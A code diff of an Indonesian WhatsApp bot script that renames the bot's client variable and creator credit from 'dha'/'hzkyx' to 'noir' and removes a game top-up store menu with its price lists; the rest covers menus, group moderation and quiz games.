@@ -150,7 +150,7 @@ let setting = JSON.parse(fs.readFileSync('./setting.json'))
 owner = setting.owner
 gamewaktu = setting.gamewaktu
 petik = '```'
-fake = 'CREATOR BOT\©hzkyx' //GANTI NAMA KAMU BEP
+fake = 'CREATOR BOT\©noir' //GANTI NAMA KAMU BEP
 ban = []
 
 // Database
@@ -231,7 +231,7 @@ const checkSCommand = (id) => {
 }
 
 
-module.exports = dha = async (dha, mek) => {
+module.exports = noir = async (noir, mek) => {
        try {
               if (!mek.hasNewMessage) return
               mek = mek.messages.all()[0]
@@ -273,15 +273,15 @@ module.exports = dha = async (dha, mek) => {
               const totalhit = JSON.parse(fs.readFileSync('./database/totalcmd.json'))[0].totalcmd
               const q = args.join(' ')
 
-              const botNumber = dha.user.jid
+              const botNumber = noir.user.jid
               const ownerNumber = setting.ownerNumber
               const ownerName = setting.ownerName
               const botName = setting.botName
               const isGroup = from.endsWith('@g.us')
               let sender = isGroup ? mek.participant : mek.key.remoteJid
-              let senderr = mek.key.fromMe ? dha.user.jid : mek.key.remoteJid.endsWith('@g.us') ? mek.participant : mek.key.remoteJid
-              const totalchat = await dha.chats.all()
-              const groupMetadata = isGroup ? await dha.groupMetadata(from) : ''
+              let senderr = mek.key.fromMe ? noir.user.jid : mek.key.remoteJid.endsWith('@g.us') ? mek.participant : mek.key.remoteJid
+              const totalchat = await noir.chats.all()
+              const groupMetadata = isGroup ? await noir.groupMetadata(from) : ''
               const groupName = isGroup ? groupMetadata.subject : ''
               const groupId = isGroup ? groupMetadata.jid : ''
               const groupMembers = isGroup ? groupMetadata.participants : ''
@@ -290,10 +290,10 @@ module.exports = dha = async (dha, mek) => {
               const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
               const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
               const isGroupAdmins = groupAdmins.includes(sender) || false
-              const conts = mek.key.fromMe ? dha.user.jid : dha.contacts[sender] || {
+              const conts = mek.key.fromMe ? noir.user.jid : noir.contacts[sender] || {
                      notify: jid.replace(/@.+/, '')
               }
-              const pushname = mek.key.fromMe ? dha.user.name : conts.notify || conts.vname || conts.name || '-'
+              const pushname = mek.key.fromMe ? noir.user.name : conts.notify || conts.vname || conts.name || '-'
               const mentionByTag = type == "extendedTextMessage" && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.mentionedJid : []
               const mentionByreply = type == "extendedTextMessage" && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.participant || "" : ""
               const mention = typeof (mentionByTag) == 'string' ? [mentionByTag] : mentionByTag
@@ -329,7 +329,7 @@ module.exports = dha = async (dha, mek) => {
               const gcount = setting.gcount
 
               const listmsg = (from, title, desc, list) => { // ngeread nya pake rowsId, jadi command nya ga keliatan
-                     let po = dha.prepareMessageFromContent(from, {
+                     let po = noir.prepareMessageFromContent(from, {
                             "listMessage": {
                                    "title": title,
                                    "description": desc,
@@ -339,7 +339,7 @@ module.exports = dha = async (dha, mek) => {
                                    "sections": list
                             }
                      }, {})
-                     return dha.relayWAMessage(po, {
+                     return noir.relayWAMessage(po, {
                             waitForAck: true
                      })
               }
@@ -360,16 +360,16 @@ module.exports = dha = async (dha, mek) => {
                      return Math.floor(Math.random() * angka) + 1
               }
               const reply = (teks) => {
-                     dha.sendMessage(from, teks, text, {
+                     noir.sendMessage(from, teks, text, {
                             quoted: mek,
                             thumbnail: fakeimage
                      })
               }
               const sendMess = (hehe, teks) => {
-                     dha.sendMessage(hehe, teks, text)
+                     noir.sendMessage(hehe, teks, text)
               }
               const mentions = (teks, memberr, id) => {
-                     (id == null || id == undefined || id == false) ? dha.sendMessage(from, {
+                     (id == null || id == undefined || id == false) ? noir.sendMessage(from, {
                             text: teks.trim(),
                             jpegThumbnail: fs.readFileSync('./media/diablo.png')
                      }, extendedText, {
@@ -377,7 +377,7 @@ module.exports = dha = async (dha, mek) => {
                             contextInfo: {
                                    "mentionedJid": memberr
                             }
-                     }): dha.sendMessage(from, {
+                     }): noir.sendMessage(from, {
                             text: teks.trim(),
                             jpegThumbnail: fs.readFileSync('./media/diablo.png')
                      }, extendedText, {
@@ -389,10 +389,10 @@ module.exports = dha = async (dha, mek) => {
                      })
               }
               const sendText = (from, text) => {
-                     dha.sendMessage(from, text, MessageType.text)
+                     noir.sendMessage(from, text, MessageType.text)
               }
               const textImg = (teks) => {
-                     return dha.sendMessage(from, teks, text, {
+                     return noir.sendMessage(from, teks, text, {
                             quoted: mek,
                             thumbnail: fs.readFileSync('./media/diablo.png')
                      })
@@ -418,29 +418,29 @@ module.exports = dha = async (dha, mek) => {
               }
               const kick = function (from, orangnya) {
                      for (let i of orangnya) {
-                            dha.groupRemove(from, [i])
+                            noir.groupRemove(from, [i])
                      }
               }
 
               const kickMember = async (id, target = []) => {
-                     let group = await dha.groupMetadata(id)
+                     let group = await noir.groupMetadata(id)
                      let owner = group.owner.replace("c.us", "s.whatsapp.net")
-                     let me = dha.user.jid
+                     let me = noir.user.jid
                      for (i of target) {
                             if (!i.includes(me) && !i.includes(owner)) {
-                                   await dha.groupRemove(to, [i])
+                                   await noir.groupRemove(to, [i])
                             } else {
-                                   await dha.sendMessage(id, "Not Premited!", "conversation")
+                                   await noir.sendMessage(id, "Not Premited!", "conversation")
                                    break
                             }
                      }
               }
               const add = function (from, orangnya) {
-                     dha.groupAdd(from, orangnya)
+                     noir.groupAdd(from, orangnya)
               }
               const sendKontak = (from, nomor, nama, org = "") => {
                      const vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + nama + '\n' + 'ORG:' + org + '\n' + 'TEL;type=CELL;type=VOICE;waid=' + nomor + ':+' + nomor + '\n' + 'END:VCARD'
-                     dha.sendMessage(from, {
+                     noir.sendMessage(from, {
                             displayname: nama,
                             vcard: vcard
                      }, MessageType.contact, {
@@ -448,13 +448,13 @@ module.exports = dha = async (dha, mek) => {
                      })
               }
               const hideTag = async function (from, text) {
-                     let anu = await dha.groupMetadata(from)
+                     let anu = await noir.groupMetadata(from)
                      let members = anu.participants
                      let ane = []
                      for (let i of members) {
                             ane.push(i.jid)
                      }
-                     dha.sendMessage(from, {
+                     noir.sendMessage(from, {
                             text: text,
                             jpegThumbnail: fs.readFileSync('media/diablo.png')
                      }, 'extendedTextMessage', {
@@ -479,7 +479,7 @@ module.exports = dha = async (dha, mek) => {
                                    if (err) return reply(`${err}`)
                                    exec(`webpmux -set exif ./sticker/data.exif ${asw} -o ${asw}`, async (error) => {
                                           if (error) return reply(`${error}`)
-                                          dha.sendMessage(from, fs.readFileSync(asw), sticker, {
+                                          noir.sendMessage(from, fs.readFileSync(asw), sticker, {
                                                  sendEphemeral: true,
                                                  quoted: mek
                                           })
@@ -512,7 +512,7 @@ module.exports = dha = async (dha, mek) => {
                             if (mime.split("/")[0] === "audio") {
                                    mime = Mimetype.mp4Audio
                             }
-                            dha.sendMessage(to, media, type, {
+                            noir.sendMessage(to, media, type, {
                                    quoted: mek,
                                    mimetype: mime,
                                    caption: text,
@@ -527,10 +527,10 @@ module.exports = dha = async (dha, mek) => {
               }
               const sendFileFromUrl = async (link, type, options) => {
                      hasil = await getBuffer(link)
-                     dha.sendMessage(from, hasil, type, options).catch(e => {
+                     noir.sendMessage(from, hasil, type, options).catch(e => {
                             fetch(link).then((hasil) => {
-                                   dha.sendMessage(from, hasil, type, options).catch(e => {
-                                          dha.sendMessage(from, {
+                                   noir.sendMessage(from, hasil, type, options).catch(e => {
+                                          noir.sendMessage(from, {
                                                  url: link
                                           }, type, options).catch(e => {
                                                  reply('_[ ! ] Error Gagal Dalam Mendownload Dan Mengirim Media_')
@@ -544,12 +544,12 @@ module.exports = dha = async (dha, mek) => {
                      if (!target.length > 0) {
                             return reply("No target..")
                      }
-                     let g = await dha.groupMetadata(to)
+                     let g = await noir.groupMetadata(to)
                      let owner = g.owner.replace("c.us", "s.whatsapp.net")
-                     let me = dha.user.jid
+                     let me = noir.user.jid
                      for (i of target) {
                             if (!i.includes(me) && !i.includes(owner)) {
-                                   const res = await dha.groupMakeAdmin(to, [i])
+                                   const res = await noir.groupMakeAdmin(to, [i])
                                    reply(`Hm..... @${mentioned[0].split('@')[0]} JABATANMU DINAIKAN AKU BANGGA PADAMU`)
                             }
                      }
@@ -558,18 +558,18 @@ module.exports = dha = async (dha, mek) => {
                      if (!target.length > 0) {
                             return reply("No target..")
                      }
-                     let g = await dha.groupMetadata(to)
+                     let g = await noir.groupMetadata(to)
                      let owner = g.owner.replace("c.us", "s.whatsapp.net")
-                     let me = dha.user.jid
+                     let me = noir.user.jid
                      for (i of target) {
                             if (!i.includes(me) && !i.includes(owner)) {
-                                   const res = await dha.groupDemoteAdmin(to, [i])
+                                   const res = await noir.groupDemoteAdmin(to, [i])
                                    reply(`Hm..... @${mentioned[0].split('@')[0]} JABATANMU TURUNKAN SAYA IKUT SEDIH`)
 
                             }
                      }
               }
-              let authorname = dha.contacts[from] != undefined ? dha.contacts[from].vname || dha.contacts[from].notify : undefined
+              let authorname = noir.contacts[from] != undefined ? noir.contacts[from].vname || noir.contacts[from].notify : undefined
               if (authorname != undefined) {} else {
                      authorname = groupName
               }
@@ -713,7 +713,7 @@ module.exports = dha = async (dha, mek) => {
                                    thumbnail: fakeimage,
                                    surface: 200,
                                    message: fake,
-                                   orderTitle: 'dha',
+                                   orderTitle: 'noir',
                                    sellerJid: '0@s.whatsapp.net'
                             }
                      }
@@ -765,7 +765,7 @@ module.exports = dha = async (dha, mek) => {
               if (isGroup && isAntiLink && !isOwner && !isGroupAdmins && isBotGroupAdmins) {
                      if (budy.match(/(https:\/\/chat.whatsapp.com)/gi)) {
                             reply(`*「 GROUP LINK DETECTOR 」*\n\nSepertinya kamu mengirimkan link grup, maaf kamu akan di kick`)
-                            dha.groupRemove(from, [sender])
+                            noir.groupRemove(from, [sender])
                      }
               }
 
@@ -783,7 +783,7 @@ module.exports = dha = async (dha, mek) => {
               }
 
               // Sewa
-              _sewa.expiredCheck(dha, sewa)
+              _sewa.expiredCheck(noir, sewa)
 
               // MUTE
               if (isMuted) {
@@ -802,7 +802,7 @@ module.exports = dha = async (dha, mek) => {
                      }
               }
               // GAME 
-              game.cekWaktuFam(dha, family100)
+              game.cekWaktuFam(noir, family100)
 
               if (tebakgambar.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                      kuis = true
@@ -827,7 +827,7 @@ module.exports = dha = async (dha, mek) => {
                             }
                      }
                      if (anjuy.length < 1) {
-                            dha.sendMessage(from, `Semua jawaban sudah tertebak\nKirim *${prefix}family100* untuk bermain lagi`, text)
+                            noir.sendMessage(from, `Semua jawaban sudah tertebak\nKirim *${prefix}family100* untuk bermain lagi`, text)
                             family100.splice(game.getfamposi(from, family100), 1)
                      }
               }
@@ -1001,9 +1001,9 @@ module.exports = dha = async (dha, mek) => {
               }
 
               // Auto Read
-              dha.chatRead(from, "read")
+              noir.chatRead(from, "read")
               //auto vn 
-              await dha.updatePresence(from, Presence.recording)
+              await noir.updatePresence(from, Presence.recording)
 
               // CMD
               if (isCmd && !isGroup)
@@ -1047,10 +1047,10 @@ module.exports = dha = async (dha, mek) => {
                                    headerType: 1
                             }
 
-                            prep = await dha.prepareMessageFromContent(from, {
+                            prep = await noir.prepareMessageFromContent(from, {
                                    buttonsMessage
                             }, {})
-                            dha.relayWAMessage(prep)
+                            noir.relayWAMessage(prep)
                             break
                      case 'owner':
                      case 'creator':
@@ -1079,14 +1079,14 @@ module.exports = dha = async (dha, mek) => {
                                    headerType: 1
                             }
 
-                            prep = await dha.prepareMessageFromContent(from, {
+                            prep = await noir.prepareMessageFromContent(from, {
                                    buttonsMessage
                             }, {})
-                            dha.relayWAMessage(prep)
+                            noir.relayWAMessage(prep)
                             break
                             const sendButImage = async (id, text1, desc1, gam1, but = [], options = {}) => {
                                    kma = gam1
-                                   mhan = await dha.prepareMessage(from, kma, image)
+                                   mhan = await noir.prepareMessage(from, kma, image)
                                    const buttonMessages = {
                                           imageMessage: mhan.message.imageMessage,
                                           contentText: text1,
@@ -1094,12 +1094,12 @@ module.exports = dha = async (dha, mek) => {
                                           buttons: but,
                                           headerType: 4
                                    }
-                                   dha.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
+                                   noir.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
                             }
 
                      case 'menu':
                      case 'help':
-                            menu = `Hai Kak.....\n*${pushname}*\n\`\`\`Saya NOIR,SENANG BISA BERTEMU DENGANMU HARI INI\`\`\`
+                            menu = `Hai Kak.....\n*${pushname}*\n\`\`\`Saya NOIR, SENANG BISA BERTEMU DENGANMU HARI INI\`\`\`
         
 𝗜𝗡𝗙𝗢 𝗣𝗘𝗡𝗚𝗚𝗨𝗡𝗔 𝗕𝗢𝗧
 ❏ NAMA : *${pushname}*
@@ -1110,7 +1110,7 @@ module.exports = dha = async (dha, mek) => {
 𝗜𝗡𝗙𝗢 𝗕𝗢𝗧
 ❏ NAMA : *NOIR BOT*
 ❏ API : @6285155064115
-❏ OWNER : *@hzkyx*
+❏ OWNER : *@noir*
 ❏ API : *@6285155064115*
 ❏ AKTIF : *${runtime(process.uptime())}*
 ❏ BATERAI : *${baterai}%*
@@ -1297,7 +1297,6 @@ Makernya banyak tu kalian masukan aja namanya sendiri
 *▢ ${prefix}artimimpi*
 *▢ ${prefix}resepmasakan*
 
-
 𝖮𝖶𝖭𝖤𝖱 𝖬𝖤𝖭𝖴 
 *▢️ ${prefix}bc* _teks_
 *▢ ${prefix}tobc* _audio_
@@ -1350,7 +1349,7 @@ Makernya banyak tu kalian masukan aja namanya sendiri
 *▢ ${prefix}babi*
 *▢ ${prefix}cekganteng*
 *▢ ${prefix}cekcantik*
-©𝑪𝒓𝒆𝒂𝒕𝒐𝒓 @hzkyx`
+©𝑪𝒓𝒆𝒂𝒕𝒐𝒓 @noir`
                             buttons = [{
                                    buttonId: `${prefix}command`,
                                    buttonText: {
@@ -1363,32 +1362,26 @@ Makernya banyak tu kalian masukan aja namanya sendiri
                                           displayText: '𝗥𝗨𝗟𝗘𝗦'
                                    },
                                    type: 1
-                            }, {
-                                   buttonId: `${prefix}store`,
-                                   buttonText: {
-                                          displayText: 'TOP UP'
-                                   },
-                                   type: 1
                             }]
 
-                            imageMsg = (await dha.prepareMessageMedia(fs.readFileSync(`./media/diablo.png`), 'imageMessage', {
+                            imageMsg = (await noir.prepareMessageMedia(fs.readFileSync(`./media/diablo.png`), 'imageMessage', {
                                    thumbnail: fs.readFileSync(`./media/diablo.png`)
                             })).imageMessage
 
                             buttonsMessage = {
                                    contentText: `${menu}`,
-                                   footerText: '\`\`\`NOIR BOT © 2k21 BY @hzkyx\`\`\`',
+                                   footerText: '\`\`\`NOIR BOT © 2k21 BY @noir\`\`\`',
                                    imageMessage: imageMsg,
                                    buttons: buttons,
                                    headerType: 4
                             }
 
-                            prep = await dha.prepareMessageFromContent(from, {
+                            prep = await noir.prepareMessageFromContent(from, {
                                    buttonsMessage
                             }, {
                                    quoted: troli
                             })
-                            dha.relayWAMessage(prep)
+                            noir.relayWAMessage(prep)
                             break
                      case 'command':
                             list = []
@@ -1408,25 +1401,6 @@ Makernya banyak tu kalian masukan aja namanya sendiri
                                    list.push(yy)
                             }
                             listmsg(from, `${ucapanWaktu}`, `Hai kak......\n*${pushname}*\nPilih Disini`, list)
-                            break
-                     case 'store':
-                            list = []
-                            listmenu = [`dmff`, `dmml`, `ucpubg`, `cpcod`, `cashpb`, `catcoin`, `candysausage`]
-                            listmenuu = [`Diamond Free Fire`, `Diamond Mobile Legends`, `Uc PUBG`, `Cp Call Of Dutty`, `Cash Poin Blank`, `Cat Coin Ragnarok`, `Candy Sausage`]
-                            nombor = 1
-                            startnum = 0
-                            for (let x of listmenu) {
-                                   const yy = {
-                                          title: 'List Harga' + nombor++,
-                                          rows: [{
-                                                 title: `${listmenuu[startnum++]}`,
-                                                 description: `\n\n\n\n\`\`\`Jangan Lupa Di Order Kak\`\`\``,
-                                                 rowId: `${prefix}${x}`
-                                          }]
-                                   }
-                                   list.push(yy)
-                            }
-                            listmsg(from, `${ucapanWaktu}`, `Hai kak.....\n*${pushname}*\nMau Top Up game apa kak pilih saja Disini`, list)
                             break
                             //------------------< Game >------------------- 
                      case 'limitgame':
@@ -1453,7 +1427,7 @@ Makernya banyak tu kalian masukan aja namanya sendiri
 • @${sender.replace("@s.whatsapp.net", "")} Menantang Bergelud
 [ ${args[0]} ] Ketik Y/N untuk menerima atau menolak permainan`
 
-                            dha.sendMessage(from, starGame, text, {
+                            noir.sendMessage(from, starGame, text, {
                                    quoted: mek,
                                    contextInfo: {
                                           mentionedJid: [sender, args[0].replace("@", "") + "@s.whatsapp.net"],
@@ -1498,7 +1472,7 @@ Makernya banyak tu kalian masukan aja namanya sendiri
                                    angka,
                                    gilir
                             })
-                            dha.sendMessage(from,
+                            noir.sendMessage(from,
                                    `*🎳 Memulai Game Tictactoe 🎲*
 
 [@${player2.split('@')[0]}] Menantang anda untuk menjadi lawan Game🔥
@@ -1536,7 +1510,7 @@ Ket : Ketik /resetgame , Untuk Mereset Permainan Yg Ada Di Grup!`, text, {
                             jawaban = get_result.name
                             kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
                             ini_buffer = await getBuffer(ini_image)
-                            dha.sendMessage(from, ini_buffer, image, {
+                            noir.sendMessage(from, ini_buffer, image, {
                                    quoted: mek,
                                    caption: '*+* ```Tebak Anime```\n\n• *Petunjuk* :' + kisi_kisi + '\n• *Waktu* : 30s'
                             }).then(() => {
@@ -1562,7 +1536,7 @@ Ket : Ketik /resetgame , Untuk Mereset Permainan Yg Ada Di Grup!`, text, {
                             kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
                             ini_buffer = await getBuffer(ini_audio)
                             reply('*+* ```Tebak Lagu```\n\n• *Petunjuk* :' + kisi_kisi + '\n• *Waktu* : 30s')
-                            dha.sendMessage(from, ini_buffer, audio, {
+                            noir.sendMessage(from, ini_buffer, audio, {
                                    quoted: mek
                             }).then(() => {
                                    tebaklagu[sender.split('@')[0]] = jawaban.toLowerCase()
@@ -1585,7 +1559,7 @@ Ket : Ketik /resetgame , Untuk Mereset Permainan Yg Ada Di Grup!`, text, {
                             jawaban = get_result.jawaban
                             kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
                             pertanyaan = get_result.soal
-                            dha.sendMessage(from, '*+* ```Tebak Tebakan```\n\n• *soal* :' + pertanyaan + '\n• *kisi²* :' + kisi_kisi, text, {
+                            noir.sendMessage(from, '*+* ```Tebak Tebakan```\n\n• *soal* :' + pertanyaan + '\n• *kisi²* :' + kisi_kisi, text, {
                                    quoted: mek
                             }).then(() => {
                                    tebaktebakan[sender.split('@')[0]] = jawaban.toLowerCase()
@@ -1607,7 +1581,7 @@ Ket : Ketik /resetgame , Untuk Mereset Permainan Yg Ada Di Grup!`, text, {
                             ini_image = get_result.soal
                             jawaban = get_result.jawaban
                             ini_buffer = await getBuffer(ini_image)
-                            dha.sendMessage(from, ini_buffer, image, {
+                            noir.sendMessage(from, ini_buffer, image, {
                                    quoted: mek,
                                    caption: '*+* ```Kuis Matematika```\n\nSilahkan jawab soal berikut ini\n\n• *Waktu* : 50s'
                             }).then(() => {
@@ -1630,7 +1604,7 @@ Ket : Ketik /resetgame , Untuk Mereset Permainan Yg Ada Di Grup!`, text, {
                             jawaban = get_result.jawaban
                             kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
                             ini_buffer = await getBuffer(ini_image)
-                            dha.sendMessage(from, ini_buffer, image, {
+                            noir.sendMessage(from, ini_buffer, image, {
                                    quoted: mek,
                                    caption: 'Silahkan jawab soal berikut ini\n\nPetunjuk :' + kisi_kisi + '\nWaktu : 30s'
                             }).then(() => {
@@ -1654,7 +1628,7 @@ Ket : Ketik /resetgame , Untuk Mereset Permainan Yg Ada Di Grup!`, text, {
                             jawaban = get_result.answer
                             kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
                             pertanyaan = get_result.question
-                            dha.sendMessage(from, '*+* ```Tebak Siapakah Aku```\n\n• *soal* :' + pertanyaan + '\n• *kisi²* :' + kisi_kisi, text, {
+                            noir.sendMessage(from, '*+* ```Tebak Siapakah Aku```\n\n• *soal* :' + pertanyaan + '\n• *kisi²* :' + kisi_kisi, text, {
                                    quoted: mek
                             }).then(() => {
                                    tebaksiapaaku[sender.split('@')[0]] = jawaban.toLowerCase()
@@ -1676,7 +1650,7 @@ Ket : Ketik /resetgame , Untuk Mereset Permainan Yg Ada Di Grup!`, text, {
                             get_result = get_result.result
                             jawaban = get_result.jawaban
                             pertanyaan = get_result.pertanyaan
-                            dha.sendMessage(from, '*+* ```Tebak Kata```\n\n• *Soal* :' + pertanyaan + '\n• *Waktu :* 30s', text, {
+                            noir.sendMessage(from, '*+* ```Tebak Kata```\n\n• *Soal* :' + pertanyaan + '\n• *Waktu :* 30s', text, {
                                    quoted: mek
                             }).then(() => {
                                    tebakata[sender.split('@')[0]] = jawaban.toLowerCase()
@@ -1699,7 +1673,7 @@ Ket : Ketik /resetgame , Untuk Mereset Permainan Yg Ada Di Grup!`, text, {
                             jawaban = get_result.answer
                             kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
                             pertanyaan = get_result.question
-                            dha.sendMessage(from, '*+* ```Tebak Lirik```\n\n• *Soal* :' + pertanyaan + '\n• *Kisi²* :' + kisi_kisi, text, {
+                            noir.sendMessage(from, '*+* ```Tebak Lirik```\n\n• *Soal* :' + pertanyaan + '\n• *Kisi²* :' + kisi_kisi, text, {
                                    quoted: mek
                             }).then(() => {
                                    tebaklirik[sender.split('@')[0]] = jawaban.toLowerCase()
@@ -1722,7 +1696,7 @@ Ket : Ketik /resetgame , Untuk Mereset Permainan Yg Ada Di Grup!`, text, {
                             jawaban = get_result.answer
                             kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
                             pertanyaan = get_result.question
-                            dha.sendMessage(from, '*+* ```Tebak Jenaka```\n\n• *Soal* :' + pertanyaan + '\n• *Kisi²* :' + kisi_kisi, text, {
+                            noir.sendMessage(from, '*+* ```Tebak Jenaka```\n\n• *Soal* :' + pertanyaan + '\n• *Kisi²* :' + kisi_kisi, text, {
                                    quoted: mek
                             }).then(() => {
                                    tebakjenaka[sender.split('@')[0]] = jawaban.toLowerCase()
@@ -1744,7 +1718,7 @@ Ket : Ketik /resetgame , Untuk Mereset Permainan Yg Ada Di Grup!`, text, {
                             get_result = get_result.result
                             jawaban = get_result.lambang
                             pertanyaan = get_result.nama
-                            dha.sendMessage(from, '*+* ```Tebak Kimia```\n\n• *Soal* :' + pertanyaan + '\n• *Waktu :* 30s', text, {
+                            noir.sendMessage(from, '*+* ```Tebak Kimia```\n\n• *Soal* :' + pertanyaan + '\n• *Waktu :* 30s', text, {
                                    quoted: mek
                             }).then(() => {
                                    tebakimia[sender.split('@')[0]] = jawaban.toLowerCase()
@@ -1767,7 +1741,7 @@ Ket : Ketik /resetgame , Untuk Mereset Permainan Yg Ada Di Grup!`, text, {
                             jawaban = get_result.name
                             kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
                             pertanyaan = get_result.flag
-                            dha.sendMessage(from, '*+* ```Tebak Bendera```\n\n• *Bendera* :' + pertanyaan + '\n• *kisi²* :' + kisi_kisi, text, {
+                            noir.sendMessage(from, '*+* ```Tebak Bendera```\n\n• *Bendera* :' + pertanyaan + '\n• *kisi²* :' + kisi_kisi, text, {
                                    quoted: mek
                             }).then(() => {
                                    tebakbendera[sender.split('@')[0]] = jawaban.toLowerCase()
@@ -1789,7 +1763,7 @@ Ket : Ketik /resetgame , Untuk Mereset Permainan Yg Ada Di Grup!`, text, {
                             get_result = get_result.result
                             jawaban = get_result.jawaban
                             pertanyaan = get_result.pertanyaan
-                            dha.sendMessage(from, '*+* ```Susun Kata```\n\n• *Soal* :' + pertanyaan + '\n• *Waktu :* 30s', text, {
+                            noir.sendMessage(from, '*+* ```Susun Kata```\n\n• *Soal* :' + pertanyaan + '\n• *Waktu :* 30s', text, {
                                    quoted: mek
                             }).then(() => {
                                    susunkata[sender.split('@')[0]] = jawaban.toLowerCase()
@@ -1812,7 +1786,7 @@ Ket : Ketik /resetgame , Untuk Mereset Permainan Yg Ada Di Grup!`, text, {
                             jawaban = get_result.jawaban
                             kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
                             pertanyaan = get_result.pertanyaan
-                            dha.sendMessage(from, '*+* ```Asah Otak```\n\n• *soal* :' + pertanyaan + '\n• *kisi²* :' + kisi_kisi, text, {
+                            noir.sendMessage(from, '*+* ```Asah Otak```\n\n• *soal* :' + pertanyaan + '\n• *kisi²* :' + kisi_kisi, text, {
                                    quoted: mek
                             }).then(() => {
                                    asahotak[sender.split('@')[0]] = jawaban.toLowerCase()
@@ -1835,7 +1809,7 @@ Ket : Ketik /resetgame , Untuk Mereset Permainan Yg Ada Di Grup!`, text, {
                             jawaban = get_result.answer
                             kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
                             pertanyaan = get_result.question
-                            dha.sendMessage(from, '*+* ```Caklontong```\n\n• *soal* :' + pertanyaan + '\n• *kisi²* :' + kisi_kisi, text, {
+                            noir.sendMessage(from, '*+* ```Caklontong```\n\n• *soal* :' + pertanyaan + '\n• *kisi²* :' + kisi_kisi, text, {
                                    quoted: mek
                             }).then(() => {
                                    caklontong[sender.split('@')[0]] = jawaban.toLowerCase()
@@ -2015,7 +1989,7 @@ Ket : Ketik /resetgame , Untuk Mereset Permainan Yg Ada Di Grup!`, text, {
 *Info Lebih Lengkap Chat Owner, Ketik ${prefix}owner*
 *_note_*:
 *Pembelian Premium yang disertai SewaBot hanya akan membayar 20K (Diskon 5K)*`
-                            dha.sendMessage(from, await getBuffer(gopeynya), image, {
+                            noir.sendMessage(from, await getBuffer(gopeynya), image, {
                                    quoted: mek,
                                    caption: teksnya
                             })
@@ -2029,231 +2003,12 @@ Ket : Ketik /resetgame , Untuk Mereset Permainan Yg Ada Di Grup!`, text, {
 • OVO : scan diatas
 • QRISS DI ATAS 
 ━━━━━━━━━━━━━━━━━━━━`
-                            dha.sendMessage(from, await getBuffer(gopeynya), image, {
+                            noir.sendMessage(from, await getBuffer(gopeynya), image, {
                                    quoted: ftoko,
                                    caption: teksnya
                             })
                             break
 
-                     case 'dmff':
-                            gopeynya = 'https://i.postimg.cc/L4wjFw1q/IMG-20210929-WA0233.jpg'
-                            teksnya = `*「DIAMOND FREEFIRE」*
-━━━━━━━━━━━━━━━━━━━━
-• *10 DIAMOND = Rp 2.000*
-• *20 DIAMOND = Rp 5.000*
-• *50 DIAMOND = Rp 8.000*
-• *70 DIAMOND = Rp 10.000*
-• *100 DIAMOND = Rp 15.000*
-• *120 DIAMOND = Rp 18.000*
-• *140 DIAMOND = Rp 20.000*
-• *210 DIAMOND = Rp 30.000*
-• *280 DIAMOND = Rp 40.000*
-• *355 DIAMOND = Rp 50.000*
-• *425 DIAMOND = Rp 60.000*
-• *495 DIAMOND = Rp 70.000*
-• *720 DIAMOND = Rp 100.000*
-• *860 DIAMOND = Rp 115.000*
-• *930 DIAMOND = Rp 125.000*
-• *1440 DIAMOND = Rp 190.000*
-• *1450 DIAMOND = Rp 200.000*
-• *2000 DIAMOND = Rp 255.000*
-• *2140 DIAMOND = Rp 285.000*
-• *2180 DIAMOND = Rp 290.000*
-• *M.MINGGUAN = Rp 30.000*
-• *M.BULANAN = Rp 118.000*
-━━━━━━━━━━━━━━━━━━━━
-*NOTE :*
-_HARGA BISA BERUBAH_
-_SEWAKTU WAKTU_
-_BUDAYAKAN BERTANYA_
-_SEBELUM PEMBELIAN_
-JIKA BERMINAT 
-#order
-ATAU HUBUNGIN HUB :
-   *(*
-wa.me/6281220670449`
-                            dha.sendMessage(from, await getBuffer(gopeynya), image, {
-                                   quoted: ftoko,
-                                   caption: teksnya
-                            })
-                            break
-                     case 'dmml':
-                            gopeynya = 'https://i.postimg.cc/L4wjFw1q/IMG-20210929-WA0233.jpg'
-                            teksnya = `*「DIAMOND MOBA」*
-━━━━━━━━━━━━━━━━━━━━
-• *12 DIAMOND = Rp 5.000*
-• *28 DIAMOND = Rp 10.000*
-• *36 DIAMOND = Rp 12.000*
-• *59 DIAMOND = Rp 19.000*
-• *86 DIAMOND = Rp 20.000*
-• *172 DIAMOND = Rp 39.000*
-• *257 DIAMOND = Rp 59.000*
-• *344 DIAMOND = Rp 75.000*
-• *429 DIAMOND = Rp 95.000*
-• *514 DIAMOND = Rp 115.000*
-• *706 DIAMOND = Rp 150.000*
-• *878 DIAMOND = Rp 188.000*
-• *963 DIAMOND = Rp 205.000*
-• *1412 DIAMOND = Rp 300.000*
-• *2195 DIAMOND = Rp 445.000*
-• *3688 DIAMOND = Rp 720.000*
-• *STARTLIGHT M = Rp 128.000*
-• *TWILIGHT PASS = Rp 128.000*
-━━━━━━━━━━━━━━━━━━━━
-*NOTE :*
-_HARGA BISA BERUBAH_
